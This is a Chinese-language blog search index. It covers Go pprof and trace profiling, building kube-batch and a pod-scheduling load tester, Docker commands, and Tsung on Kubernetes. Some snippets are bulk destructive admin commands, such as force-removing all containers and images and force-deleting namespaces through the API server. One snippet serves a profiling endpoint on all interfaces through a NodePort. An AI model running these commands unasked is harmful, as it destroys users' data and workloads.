github.com/kubernet","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:2:3","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"监控方式 如果你的应用程序是一直运行的，比如 web 应用，那么可以使用net/http/pprof库，它能够在提供 HTTP 服务进行分析。 如果使用了默认的http.DefaultServeMux（通常是代码直接使用 http.ListenAndServe(“0.0.0.0:8000”, nil)），只需要在你的web server端代码中按如下方式导入net/http/pprof 此方式适合测试一些服务进程的性能，当某场景触发时，通过接口采集性能数据，便于查看程序的动态性能。 如测试调度器在压力测试场景中的性能。采用此监控http方式，详细查看[pprof开启] ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:2:4","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"安装graphviz graphviz是将结构信息表示为抽象图和网络图的一种方法。自动图形绘制在软件工程、数据库和网页设计、网络化以及其他许多领域的可视化界面中都有着重要的应用。 graphviz安装完成后，在后面使用pprof生成的测试profile，可以转成svg等格式（如调度图），进行可视化查看 graphviz下载地址 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:3:0","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"安装命令 # Ubuntu packages* sudo apt install graphviz # Fedora project* sudo yum install graphviz # Debian packages* sudo apt install graphviz # Stable and development rpms for Redhat Enterprise, or CentOS systems* available but are out of date. sudo yum install graphviz ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:3:1","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"测试graphviz是否安装成功 [root@node61 ~]# dot -V dot - graphviz version 2.47.0 (20210316.0004) [root@node61 ~]# [root@node61 ~]# ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:3:2","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"pprof开启 包pprof以pprof可视化工具所期望的格式通过其HTTP服务器运行时分析数据提供服务。通常，导入包只是为了注册其HTTP处理程序的副作用。所处理的路径都以/DEBUG/pprof/开头。 go语言提供包： runtime/pprof：采集工具型应用运行数据进行分析 net/http/pprof：采集服务型应用运行时数据进行分析 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:0","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"如何使用pprof 导入pprof包 // pprof import _ \"net/http/pprof\" 这一句导致源码里面实际执行的是: func init() { http.HandleFunc(\"/debug/pprof/\", Index) http.HandleFunc(\"/debug/pprof/cmdline\", Cmdline) http.HandleFunc(\"/debug/pprof/profile\", Profile) http.HandleFunc(\"/debug/pprof/symbol\", Symbol) http.HandleFunc(\"/debug/pprof/trace\", Trace) } 上面的url和处理函数都被注册到了http包的DefaultServeMux里面，所以要想使用这些url就必须使用DefaultServeMux来监听某一端口： 如果应用程序尚未运行http服务器，则需要启动该服务器。在导入中添加“net/http”和“log”，并在主函数中添加以下代码： // pprof go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }() 这里第一个参数可以是本机的任一端口，当第二个参数为nil时就使用http包的DefaultServeMux来监听并处理http请求， 或者当程序里面已经有自定义的ServeMux时，可以像上面的init函数那样把pprof的处理函数注册到自定义的ServeMux。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:1","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"heap profile go tool pprof http://localhost:6060/debug/pprof/heap ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:2","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"30-second CPU profile # go tool pprof http://localhost:6060/debug/pprof/profile?seconds=30 go tool pprof http://10.151.11.61:39999/debug/pprof/profile?seconds=30 这个http请求会等seconds参数指定的秒数，这期间读取请求返回的二进制格式内容，我们把返回的内容保存为文件，假设取名为cpu.prof, 这个文件里面包含了程序收到请求后的seconds秒内运行占用CPU的情况。 接下来我们通过在命令行输入go tool pprof来查看cpu.prof: go tool pprof cpu.prof 这个命令会进入命令行交互，我们可以输入很多子命令来查看相关信息，最常用的几个子命令是： # top N top 10 该子命令会列出最耗时的N个函数调用，在输入top命令前输入cum或flat可以使得top列出的列表按cum或flat列排序，flat是单个函数自身（不计函数里面调用的其它函数）的耗时，cum是函数从进入到退出总的耗时。 如果要看某个函数具体是在什么地方耗时，可以使用list子命令查看： list func_name_in_top_list 该命令会显示耗时的代码和行号, 如果提示找不到source信息，可以在go tool pprof后面指定保存在本地的被profile程序的binary文件，并且这个binary文件要和生成profile文件的程序是在同一平台下编译的。比如在本地的Windows机器上远程profile linux机器上运行的go程序时，确保本地指定的binary是linux机器上编译的： go tool pprof mybinarypath prof_file_from_remote_host go tool pprof mybinarypath https://myremotehost/debug/pprof/profile 为了更直观的看出热点函数的调用关系，我们更多的是使用svg和web子命令： ###svg \u003e xxx.svg ##web svg svg命令会生成一个指定文件名的svg文件，web命令会生成一个svg文件并用浏览器打开这个文件，执行web命令前先确保安装了graphviz（brew install graphviz, 然后brew list graphviz查看安装位置并将安装位置的bin目录加到PATH），并确保svg文件的默认打开程序是浏览器。 通过web子命令在浏览器打开的这个svg文件非常有用, 可以清楚的看到耗时函数的调用关系图。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:3","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"查看环境cpu profile命令 在环境中，获取cpu pofile命令，默认采集时长30秒 go tool pprof http://10.151.11.61:8080/debug/pprof/profile fetch完成后，会进入pprof，然后输入svg，（环境中使用web自动打开svg），导出xxx.svg文件，将该svg文件拷贝出来，使用浏览器打开即可。 type \"help \u003ccmd|option\u003e\" for more information(pprof) svgGenerating report in profile001.svg ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:4","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"调度图 把上面的xxx.svg文件，使用浏览器打开，就能看到调度图，里面包含了各函数之间的调用性能 关于图形的说明： 每个框代表一个函数，理论上框的越大表示占用的CPU资源越多。 方框之间的线条代表函数之间的调用关系。 线条上的数字表示函数调用的次数。 方框中的第一行数字表示当前函数占用CPU的百分比，第二行数字表示当前函数累计占用CPU的百分比。 go tool pprof默认是使用-inuse_space进行统计，还可以使用-inuse-objects查看分配对象的数量。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:5","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"goroutine blocking profile go tool pprof http://localhost:6060/debug/pprof/block ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:6","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"the holders of contended mutexes go tool pprof http://localhost:6060/debug/pprof/mutex ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:7","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"execution trace 该包还导出一个处理程序，该处理程序为“Go Tool Track”命令提供执行跟踪数据。收集5秒钟的执行跟踪 wget -O trace.out http://localhost:6060/debug/pprof/trace?seconds=5 go tool trace trace.out ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:8","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"trace查看 trace获取 在环境中获取trace数据 # kube-batch pprof # http://10.151.11.61:39999/debug/pprof/ wget -O trace.out http://10.151.11.61:39999/debug/pprof/trace?seconds=10 或者直接本地通过浏览器访问http://10.151.11.61:39999/debug/pprof/ 获取trace数据。 trace分析 把环境中获得的trace文件，拷贝到本地，并输入如下命令 # go tool trace trace.out go tool trace trace 本地需安装有go环境，此时自动调用浏览器打开trace $ go tool trace trace2021/04/05 12:10:17 Parsing trace...2021/04/05 12:10:20 Splitting trace...2021/04/05 12:10:21 Opening browser. Trace viewer is listening on http://127.0.0.1:50907 使用浏览器打开访问页面如下图 现在可以进行以下项分析 View trace Goroutine analysis Network blocking profile Synchronization blocking profile Syscall blocking profile Scheduler latency profile User-defined tasks User-defined regions Minimum mutator utilization 常用的有： View trace Goroutine analysis Network blocking profile Synchronization blocking profile Syscall blocking profile ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:9","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"all available profiles 若要查看所有可用的配置文件，请在浏览器中打开http://localhost:6060/debug/pprof/。 http://localhost:6060/debug/pprof/ 使用浏览器打开访问页面如下图 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:10","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"pprof包 pprof包介绍见下链接 pprof包详细内容 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:4:11","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"实例分析 问题：k8s部署的一个go程序组件的性能在压测条件下，性能指标（吞吐量、延时）表现不好 由于是底层程序组件，不易采用日志打印方式来定位问题原因，考虑go pprof分析。 结合程序运行cpu和内存情况，发现内存使用正常，但cpu利用率很高。重点分析cpu profile ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:5:0","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"pprof配置 pprof server config 在9999端口开启pprof服务 // main.go // pprof import _ \"net/http/pprof\" func main() { // ... // pprof if s.Profiling{ go http.ListenAndServe(\":9999\", nil) } // ... } pprof service 编辑 service.yaml，使得环境node的39999端口映射到待调试k8s程序 apiVersion:v1kind:Servicemetadata:namespace:kube-systemname:kube-batch-prometheus-discoverylabels:k8s-app:kube-batchspec:selector:k8s-app:kube-batch#type: ClusterIPtype:NodePortports:- name:http-metricsport:8080targetPort:8080protocol:TCP# pprof port setting- name:http-pprofnodePort:39999port:9999targetPort:9999protocol:TCP 重启程序和服务，运行压测，待场景触发时，浏览器访问http://node_ip:39999/debug/pprof/ 或者 通过命令行方式获取pprof文件 # http://10.151.11.61:39999/debug/pprof/ ## trace文件 wget -O trace.out http://10.151.11.61:39999/debug/pprof/trace?seconds=10 ## cpu profile，默认30s，进入pprof后，输入svg，导出svg文件 go tool pprof http://10.151.11.61:39999/debug/pprof/profile #type \"help \u003ccmd|option\u003e\" for more information #(pprof) svg #Generating report in profile001.svg ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:5:1","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"调度图 浏览器打开之前导出的svg文件，如profile001.svg 可知predicates协程的FilteredList函数cpu占比较大，处理耗时较长。需要进行优化。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:5:2","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"trace图 优化前，协程运行和执行时间 此时执行时间基本上都在130ms左右，耗时较长，影响性能。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:5:3","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"优化后的pprof 调度图 函数列表信息 对比优化前性能得到改善。 trace图 协程运行和执行时间 最后优化结果性能，执行时间基本上都在20ms以内，程序的性能经优化得到改善。 ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:5:4","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["Go"],"content":"参考资料 如何获取运行的go程序的profile信息 go package pprof Go程序性能分析方法（一文全解） Go execution tracer Debugging performance issues in Go* programs ","date":"2021-04-05","objectID":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/:6:0","tags":["Go"],"title":"Go程序性能分析pprof","uri":"/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/"},{"categories":["K8S"],"content":"编译kube-batch项目和自己开发的压测工具density。 ","date":"2021-03-31","objectID":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/:0:0","tags":["K8S"],"title":"编译kube-batch和density","uri":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/"},{"categories":["K8S"],"content":"编译kube-batch 编译kube-batch镜像 # go build export GOPATH=/home/wangb/projects export GO111MODULE=\"off\" cd /home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch make clean make # make image image_dir=/home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch/deployment/images rm -rf ${image_dir}/kube-batch cp _output/bin/kube-batch ${image_dir} cd ${image_dir} docker build -t kube-batch:test . ","date":"2021-03-31","objectID":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/:1:0","tags":["K8S"],"title":"编译kube-batch和density","uri":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/"},{"categories":["K8S"],"content":"编译 density density是自己开发的对k8s调度器和kube-batch调度器进行性能测试的工具 export GOPATH=/home/wangb/projects/ export GO111MODULE=\"off\" cd /home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch/cmd/perf-test/cmd/density go clean go build -o density ","date":"2021-03-31","objectID":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/:2:0","tags":["K8S"],"title":"编译kube-batch和density","uri":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/"},{"categories":["K8S"],"content":"density 测试命令 创建测试namespace，density在density-test命名空间下进行pod调度性能测试 kubectl create namespace density-test # test cmd # pnum 需调度pod总数 # qps density的client发射qps参数，影响pod的创建速率 ./density --pnum 50 --qps 200 ./density --pnum 3 --qps 100 # kube-batch scheduler ./density --name kube-batch --pnum 1000 --qps 1000 # k8s scheduler ./density --name default --pnum 1000 --qps 1000 # kube-batch scheduler ./density --name kube-batch --pnum 5000 --qps 1000 # k8s scheduler ./density --name default --pnum 5000 --qps 1000 ","date":"2021-03-31","objectID":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/:2:1","tags":["K8S"],"title":"编译kube-batch和density","uri":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/"},{"categories":["K8S"],"content":"清理测试pod资源 # batch delete terminating pods NAMESPACE=density-test kubectl get po -n $NAMESPACE |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 ","date":"2021-03-31","objectID":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/:2:2","tags":["K8S"],"title":"编译kube-batch和density","uri":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/"},{"categories":["K8S"],"content":"清理namespace：density-test资源 # 强制删除ns为test- 的资源 kubectl get ns |grep density-test |awk '{print $1}' |xargs kubectl delete ns --force --grace-period=0 cd /tmp/ ns_test=$(kubectl get ns |grep density-test |grep Terminating|awk '{print $1}') kubectl get namespace ${ns_test} -o json \u003etemp.json sed -i '12,19d' temp.json sed -i 's/},/}/g' temp.json curl -k -H \"Content-Type: application/json\" -X PUT --data-binary @temp.json 192.168.1.100:8080/api/v1/namespaces/${ns_test}/finalize ","date":"2021-03-31","objectID":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/:2:3","tags":["K8S"],"title":"编译kube-batch和density","uri":"/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/"},{"categories":["Docker"],"content":"Docker常用操作命令集合，持续更新~~~ ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:0:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"制作自己的镜像 1.从远程仓库拉取一个纯净的 centos 系统镜像 查询 centos 相关的镜像 docker search centos 下载镜像到本地 docker pull 镜像名 docker pull centos 查看镜像 查看本地镜像 docker images docker images |grep centos 创建并进入容器 创建容器 　格式：docker run -dit –name=容器名 镜像id /bin/bash　查看所有的容器 docker ps -a 进入容器 格式：docker exec -it 容器名 /bin/bash　将容器制作成镜像 进入容器并操作完成并退出后，commit当前容器为执行名称镜像 格式：docker commit -m ‘镜像描述’ -a ‘制作者’ 容器名 镜像名 # 容器id或名称 cidname=111xxx # 镜像id或名称 midname=wwwxxx docker commit -m 'make image' ${cidname} ${midname} 打包镜像 将制作好的镜像打成 tar 包 格式：docker save -o tar包的名字 镜像名 # 镜像id或名称 midname=wwwxxx # tar包名 tarname=yyyxxx.img.tar # 保存镜像到tar包 docker save ${midname} -o ${tarname} 使用镜像 tarname=yyyxxx.img.tar # 导出tar包输出镜像 docker load -i ${tarname} ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:1:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"[DOCKER]从容器外部复制文件到容器 从外部复制到容器内： docker cp source container:target_path # 待拷贝文件位置 file_source=xxxx # 容器id或名称 cidname=111xxx # 容器内目标位置 target_path=/tmp docker cp ${file_source} ${cidname}:${target_path} 从容器内部复制到容器外： docker cp container:source_path output_path # 容器id或名称 cidname=111xxx # 容器内文件位置 source_path=/tmp # 待拷贝文件输出位置 output_path=/home docker cp ${cidname}:${source_path} ${output_path} ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:2:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"停用全部运行中的容器 docker stop $(docker ps -q) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:3:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"删除全部容器 docker rm $(docker ps -aq) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:4:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"一条命令实现停用并删除容器 docker stop $(docker ps -q) \u0026 docker rm $(docker ps -aq) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:5:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"杀死所有正在运行的容器 docker kill $(docker ps -a -q) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:6:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"删除所有已经停止的容器 docker rm $(docker ps -a -q) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:7:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"删除所有未打 dangling 标签的镜像 表示清理当前repo:tag为“”的镜像。在对应的镜像repo:tag构建新的镜像的时候，旧的镜像就会从repo:tag中移走，进而成为“”，这个时候，我们就可以对这些进行清理 docker rmi $(docker images -q -f dangling=true) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:8:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"删除所有镜像 docker rmi $(docker images -q) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:9:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"强制删除 无法删除的镜像 # 删除指定镜像 docker rmi -f \u003cIMAGE_ID\u003e # 删除所有镜像 docker rmi -f $(docker images -q) ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:10:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["Docker"],"content":"命令集 ~/.bash_aliases # 杀死所有正在运行的容器. alias dockerkill='docker kill $(docker ps -a -q)' # 删除所有已经停止的容器. alias dockercleanc='docker rm $(docker ps -a -q)' # 删除所有未打标签的镜像. alias dockercleani='docker rmi $(docker images -q -f dangling=true)' # 删除所有已经停止的容器和未打标签的镜像. alias dockerclean='dockercleanc || true \u0026\u0026 dockercleani' ","date":"2021-03-12","objectID":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:11:0","tags":["Docker"],"title":"Docker常用操作命令集合","uri":"/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"业务压力测试tsung-in-k8s","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"在K8S中部署业务压力测试工具tsung，修改并进行了自测验证 Running Tsung in Kubernetes This project demonstrate one possible way to run Tsung in Kubernetes using StatefulSet. ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:0:0","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"About Tsung [Tsung] is an open-source multi-protocol distributed load testing tool written in [Erlang]. With proper setup, Tsung could generate millions of virtual users accessing target endpoints. Typically we run Tsung in baremetal machines or virtual machines. In order to launch Tsung in Kubernetes, we have to figure out a way to assign hostnames to Tsung pods because Tsung master have to connect to slaves using their hostnames. 